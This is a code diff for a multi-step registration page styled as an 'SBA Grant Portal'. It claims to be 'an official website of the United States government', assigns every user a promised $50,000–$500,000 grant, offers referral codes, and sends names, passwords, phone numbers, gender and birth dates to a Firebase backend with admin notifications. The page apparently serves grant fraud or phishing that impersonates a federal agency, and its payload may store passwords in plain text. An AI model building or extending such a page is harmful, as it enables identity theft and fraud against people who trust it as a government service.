@@ -1,112 +1,341 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Register | SBA Grant Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apply for Federal Funding | SBA Grant Portal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
     <style>
+        .reg-container { min-height: 100vh; display: flex; flex-direction: column; background: var(--bg); }
+        .reg-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+        .reg-card { width: 100%; max-width: 520px; animation: fadeSlide 0.4s ease; }
         .reg-step { display: none; }
-        .reg-step.active { display: block; animation: fadeIn 0.3s ease; }
-        .progress-bar { height: 8px; background: #eee; border-radius: 4px; margin: 20px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--sba-navy); width: 33%; transition: width 0.3s ease; }
-        .password-strength { height: 4px; margin-top: 5px; border-radius: 2px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .reg-step.active { display: block; animation: fadeSlide 0.3s ease; }
+        
+        /* Step Indicator custom override */
+        .step-indicator { margin-bottom: 40px; }
+        
+        .referral-toggle { color: var(--navy); font-size: 0.85rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; margin-top: 10px; }
+        .referral-box { display: none; margin-top: 10px; }
+        .referral-box.show { display: block; }
     </style>
 </head>
 <body>
 
+    <div id="pageLoader" class="page-loader"><div class="spinner"></div></div>
+
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="USA Flag">
-        <span>Identity verification is required for all federal assistance</span>
+        <span>An official website of the United States government</span>
     </div>
 
-    <div class="container" style="max-width: 500px;">
-        <div class="card">
-            <div style="text-align: center;">
-                <img src="sba-logo.png" alt="SBA Logo" style="height: 50px;">
-                <h2 style="color: var(--sba-navy); margin-top: 10px;">Grant Enrollment</h2>
+    <div class="reg-container">
+        <div class="reg-content">
+            <div class="reg-card">
+                <div class="text-center mb-8">
+                    <div class="sba-logo" style="justify-content: center; margin-bottom: 24px;">
+                        <svg class="sba-logo__mark" viewBox="0 0 80 80"><path d="M6 6 H32 V14 H14 V32 H6 Z" fill="#003087"/><path d="M48 66 H66 V48 H74 V74 H48 Z" fill="#c8102e"/><text x="8" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">S</text><text x="28" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">B</text><text x="50" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">A</text></svg>
+                    </div>
+                    <h1 style="font-size: 1.5rem; font-weight: 800;">Grant Application Account</h1>
+                    <p class="text-muted">Step-by-step federal enrollment process</p>
+                </div>
+
+                <div class="step-indicator" id="stepIndicator">
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot active" data-step="1">1</div>
+                        <span class="step-indicator__label active">Account</span>
+                        <div class="step-indicator__connector"></div>
+                    </div>
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot" data-step="2">2</div>
+                        <span class="step-indicator__label">Personal</span>
+                        <div class="step-indicator__connector"></div>
+                    </div>
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot" data-step="3">3</div>
+                        <span class="step-indicator__label">Program</span>
+                    </div>
+                </div>
+
+                <div class="card card--shadow">
+                    <form id="regForm">
+                        <!-- STEP 1: ACCOUNT -->
+                        <div class="reg-step active" id="step1">
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Full Legal Name</label>
+                                <input type="text" id="fullName" class="form-input" placeholder="As shown on your ID">
+                                <span class="form-error" id="err-fullName">Please enter your full legal name.</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Email Address</label>
+                                <input type="email" id="email" class="form-input" placeholder="your@email.com">
+                                <span class="form-error" id="err-email">Valid email is required.</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Username</label>
+                                <input type="text" id="username" class="form-input" placeholder="Choose a username">
+                                <span class="form-error" id="err-username">Username must be 3-20 chars (lowercase/numbers only).</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Password</label>
+                                <input type="password" id="password" class="form-input" placeholder="Min. 8 characters">
+                                <div class="strength-meter"><div class="strength-bar" id="strengthBar"></div></div>
+                                <div class="strength-label" id="strengthLabel">Password Strength</div>
+                                <span class="form-error" id="err-password">Password must be at least 8 characters.</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Confirm Password</label>
+                                <input type="password" id="confirmPassword" class="form-input" placeholder="Repeat password">
+                                <span class="form-error" id="err-confirmPassword">Passwords do not match.</span>
+                            </div>
+                            <div class="form-group flex items-center gap-2">
+                                <input type="checkbox" id="terms" style="width:16px; height:16px;">
+                                <label for="terms" style="font-size:0.8rem; color:var(--text-secondary);">I agree to the <a href="terms.html" target="_blank" class="text-navy">SBA Terms & Conditions</a></label>
+                            </div>
+                            <span class="form-error mb-4" id="err-terms">You must accept the terms.</span>
+                            <button type="button" class="btn btn--primary btn--full" id="btnStep1">Continue <i class="fa-solid fa-arrow-right"></i></button>
+                        </div>
+
+                        <!-- STEP 2: PERSONAL -->
+                        <div class="reg-step" id="step2">
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Phone Number</label>
+                                <div class="flex gap-2">
+                                    <input type="text" value="+1" class="form-input" style="width: 60px;" readonly>
+                                    <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 000-0000">
+                                </div>
+                                <span class="form-error" id="err-phoneNumber">Valid phone number is required.</span>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label class="form-label form-label--required">Country</label>
+                                    <select id="country" class="form-select">
+                                        <option value="United States">United States</option>
+                                        <option value="Canada">Canada</option>
+                                        <option value="United Kingdom">United Kingdom</option>
+                                        <option value="Australia">Australia</option>
+                                    </select>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label form-label--required">Gender</label>
+                                    <select id="gender" class="form-select">
+                                        <option value="">Select...</option>
+                                        <option value="Male">Male</option>
+                                        <option value="Female">Female</option>
+                                        <option value="Other">Other / Prefer not to say</option>
+                                    </select>
+                                    <span class="form-error" id="err-gender">Please select your gender.</span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Date of Birth</label>
+                                <input type="date" id="dob" class="form-input">
+                                <span class="form-error" id="err-dob">You must be at least 18 years old.</span>
+                            </div>
+                            <div class="referral-toggle" id="refToggle"><i class="fa-solid fa-plus"></i> Have a referral code?</div>
+                            <div class="referral-box" id="refBox">
+                                <input type="text" id="referredBy" class="form-input" placeholder="Enter code (optional)">
+                            </div>
+                            <div class="flex gap-4 mt-8">
+                                <button type="button" class="btn btn--ghost flex-1" id="btnBack1">Back</button>
+                                <button type="button" class="btn btn--primary flex-1" id="btnStep2">Continue <i class="fa-solid fa-arrow-right"></i></button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 3: PROGRAM -->
+                        <div class="reg-step" id="step3">
+                            <div class="alert alert--info mb-6">
+                                <i class="fa-solid fa-circle-info"></i>
+                                <div>
+                                    <strong>Program Assignment</strong>
+                                    <p style="font-size:0.8rem; margin-top:4px;">Based on current federal availability, you are being enrolled in the <strong>SBA Grant Program</strong>.</p>
+                                </div>
+                            </div>
+                            <div class="card card--navy mb-6" style="padding: 20px;">
+                                <div style="font-size: 0.7rem; text-transform: uppercase; opacity: 0.7;">Qualified Funding Range</div>
+                                <div style="font-size: 1.8rem; font-weight: 800; color: #fbbf24;">$50,000 — $500,000</div>
+                            </div>
+                            <h4 class="mb-4">Enrollment Benefits:</h4>
+                            <ul style="list-style: none; font-size: 0.85rem; line-height: 2;">
+                                <li><i class="fa-solid fa-check text-success"></i> Priority Application Processing</li>
+                                <li><i class="fa-solid fa-check text-success"></i> Dedicated SBA Case Officer</li>
+                                <li><i class="fa-solid fa-check text-success"></i> Federal Compliance Monitoring</li>
+                            </ul>
+                            <div class="flex gap-4 mt-8">
+                                <button type="button" class="btn btn--ghost flex-1" id="btnBack2">Back</button>
+                                <button type="submit" class="btn btn--primary flex-1" id="btnSubmit">Create Account</button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="text-center mt-6">
+                    <p class="text-muted" style="font-size: 0.85rem;">Already have an account? <a href="login.html" class="text-navy" style="font-weight: 700;">Sign In</a></p>
+                </div>
             </div>
-
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-
-            <form id="regForm">
-                <!-- Step 1: Account Credentials -->
-                <div class="reg-step active" id="step1">
-                    <h4 style="margin-bottom: 15px;">Step 1: Account Security</h4>
-                    <div class="form-group">
-                        <label class="form-label">Full Legal Name</label>
-                        <input type="text" class="form-input" id="fullName" required>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Email Address</label>
-                        <input type="email" class="form-input" id="email" required>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Create Password</label>
-                        <input type="password" class="form-input" id="password" required>
-                        <div id="strengthMeter" class="password-strength"></div>
-                    </div>
-                    <button type="button" class="btn btn-primary btn-full" onclick="changeStep(2)">Next: Personal Info</button>
-                </div>
-
-                <!-- Step 2: Personal Details -->
-                <div class="reg-step" id="step2">
-                    <h4 style="margin-bottom: 15px;">Step 2: Personal Details</h4>
-                    <div class="form-group">
-                        <label class="form-label">Phone Number</label>
-                        <input type="tel" class="form-input" id="phone" required>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Country of Residence</label>
-                        <select class="form-select" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border);" id="country">
-                            <option value="US">United States</option>
-                            <option value="CA">Canada</option>
-                            <option value="UK">United Kingdom</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Date of Birth</label>
-                        <input type="date" class="form-input" id="dob" required>
-                    </div>
-                    <div style="display: flex; gap: 10px;">
-                        <button type="button" class="btn btn-outline flex-1" onclick="changeStep(1)">Back</button>
-                        <button type="button" class="btn btn-primary flex-1" onclick="changeStep(3)">Next: Finalize</button>
-                    </div>
-                </div>
-
-                <!-- Step 3: Finalize -->
-                <div class="reg-step" id="step3">
-                    <h4 style="margin-bottom: 15px;">Step 3: Verification Notice</h4>
-                    <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 20px;">
-                        By clicking "Complete Registration," you certify that all information is true. Federal law provides for severe penalties for providing false statements on grant applications.
-                    </p>
-                    <div style="display: flex; gap: 10px;">
-                        <button type="button" class="btn btn-outline flex-1" onclick="changeStep(2)">Back</button>
-                        <button type="submit" class="btn btn-primary flex-1" style="background: var(--success);" id="finishBtn">Complete Registration</button>
-                    </div>
-                </div>
-            </form>
         </div>
     </div>
 
     <script type="module">
-        window.changeStep = (step) => {
-            document.querySelectorAll('.reg-step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step' + step).classList.add('active');
-            document.getElementById('progressFill').style.width = (step * 33.33) + '%';
+        import { 
+            auth, db, createUserWithEmailAndPassword, updateProfile, setDoc, doc, 
+            sendEmailVerification, buildNewUserPayload, saveRegStep, getRegData, clearRegData,
+            notifyAdmins, serverTimestamp
+        } from './firebase-config.js';
+        import { initTheme, setButtonLoading, showToast, hideLoader } from './app.js';
+
+        initTheme();
+        hideLoader();
+
+        const form = document.getElementById('regForm');
+        const steps = ['step1', 'step2', 'step3'];
+        let currentStepIdx = 0;
+
+        // Restore from session storage if available
+        const saved = getRegData();
+        if (saved.fullName) document.getElementById('fullName').value = saved.fullName;
+        if (saved.email) document.getElementById('email').value = saved.email;
+        if (saved.username) document.getElementById('username').value = saved.username;
+
+        // Step Navigation
+        const updateUI = () => {
+            steps.forEach((id, idx) => {
+                document.getElementById(id).classList.toggle('active', idx === currentStepIdx);
+            });
+            document.querySelectorAll('.step-indicator__dot').forEach((dot, idx) => {
+                dot.classList.toggle('active', idx === currentStepIdx);
+                dot.classList.toggle('done', idx < currentStepIdx);
+                if(idx < currentStepIdx) dot.innerHTML = '<i class="fa-solid fa-check"></i>';
+                else dot.innerHTML = idx + 1;
+            });
+            document.querySelectorAll('.step-indicator__label').forEach((label, idx) => {
+                label.classList.toggle('active', idx === currentStepIdx);
+            });
+            document.querySelectorAll('.step-indicator__connector').forEach((conn, idx) => {
+                conn.classList.toggle('done', idx < currentStepIdx);
+            });
         };
 
-        // Password Strength Visualizer
+        // Password Strength
         const passInput = document.getElementById('password');
-        const meter = document.getElementById('strengthMeter');
-        passInput.addEventListener('input', () => {
+        passInput.oninput = () => {
             const val = passInput.value;
-            if(val.length < 4) meter.style.background = 'var(--error)';
-            else if(val.length < 8) meter.style.background = 'var(--warning)';
-            else meter.style.background = 'var(--success)';
-        });
+            const bar = document.getElementById('strengthBar');
+            const label = document.getElementById('strengthLabel');
+            let strength = 0;
+            if (val.length >= 8) strength += 25;
+            if (/[A-Z]/.test(val)) strength += 25;
+            if (/[0-9]/.test(val)) strength += 25;
+            if (/[^A-Za-z0-9]/.test(val)) strength += 25;
+
+            bar.style.width = strength + '%';
+            if (strength <= 25) { bar.style.background = 'var(--error)'; label.textContent = 'Weak'; }
+            else if (strength <= 75) { bar.style.background = 'var(--warning)'; label.textContent = 'Moderate'; }
+            else { bar.style.background = 'var(--success)'; label.textContent = 'Strong'; }
+        };
+
+        // Validation & Next
+        document.getElementById('btnStep1').onclick = () => {
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const confirm = document.getElementById('confirmPassword').value;
+            const terms = document.getElementById('terms').checked;
+
+            let valid = true;
+            document.querySelectorAll('.form-error').forEach(e => e.classList.remove('show'));
+
+            if (fullName.split(' ').length < 2) { document.getElementById('err-fullName').classList.add('show'); valid = false; }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('err-email').classList.add('show'); valid = false; }
+            if (username.length < 3) { document.getElementById('err-username').classList.add('show'); valid = false; }
+            if (password.length < 8) { document.getElementById('err-password').classList.add('show'); valid = false; }
+            if (password !== confirm) { document.getElementById('err-confirmPassword').classList.add('show'); valid = false; }
+            if (!terms) { document.getElementById('err-terms').classList.add('show'); valid = false; }
+
+            if (valid) {
+                saveRegStep({ fullName, email, username });
+                currentStepIdx = 1;
+                updateUI();
+            }
+        };
+
+        document.getElementById('btnStep2').onclick = () => {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const dob = document.getElementById('dob').value;
+            const gender = document.getElementById('gender').value;
+
+            let valid = true;
+            document.querySelectorAll('.form-error').forEach(e => e.classList.remove('show'));
+
+            if (phone.length < 7) { document.getElementById('err-phoneNumber').classList.add('show'); valid = false; }
+            if (!gender) { document.getElementById('err-gender').classList.add('show'); valid = false; }
+            
+            const age = Math.floor((new Date() - new Date(dob)) / 31557600000);
+            if (!dob || age < 18) { document.getElementById('err-dob').classList.add('show'); valid = false; }
+
+            if (valid) {
+                currentStepIdx = 2;
+                updateUI();
+            }
+        };
+
+        document.getElementById('btnBack1').onclick = () => { currentStepIdx = 0; updateUI(); };
+        document.getElementById('btnBack2').onclick = () => { currentStepIdx = 1; updateUI(); };
+
+        document.getElementById('refToggle').onclick = () => {
+            document.getElementById('refBox').classList.toggle('show');
+            document.getElementById('refToggle').innerHTML = document.getElementById('refBox').classList.contains('show') 
+                ? '<i class="fa-solid fa-minus"></i> Remove referral code' 
+                : '<i class="fa-solid fa-plus"></i> Have a referral code?';
+        };
+
+        // Final Submission
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btnSubmit');
+            setButtonLoading(btn, true, 'Creating Account...');
+
+            const formData = {
+                fullName: document.getElementById('fullName').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                username: document.getElementById('username').value.trim(),
+                password: document.getElementById('password').value,
+                phoneNumber: '+1' + document.getElementById('phoneNumber').value.trim(),
+                country: document.getElementById('country').value,
+                gender: document.getElementById('gender').value,
+                dob: document.getElementById('dob').value,
+                referredBy: document.getElementById('referredBy').value.trim()
+            };
+
+            try {
+                const cred = await createUserWithEmailAndPassword(auth, formData.email, formData.password);
+                const uid = cred.user.uid;
+                
+                await updateProfile(cred.user, { displayName: formData.fullName });
+                
+                const payload = buildNewUserPayload({ ...formData, uid });
+                await setDoc(doc(db, "users", uid), payload);
+                
+                await sendEmailVerification(cred.user);
+                
+                await notifyAdmins({
+                    title: 'New User Registered',
+                    message: `${formData.fullName} has joined the portal.`,
+                    type: 'info',
+                    link: 'admin-portal.html'
+                });
+
+                clearRegData();
+                window.location.href = 'verify.html';
+            } catch (err) {
+                console.error(err);
+                showToast(err.message, 'error');
+                setButtonLoading(btn, false);
+            }
+        };
     </script>
 </body>
 </html>
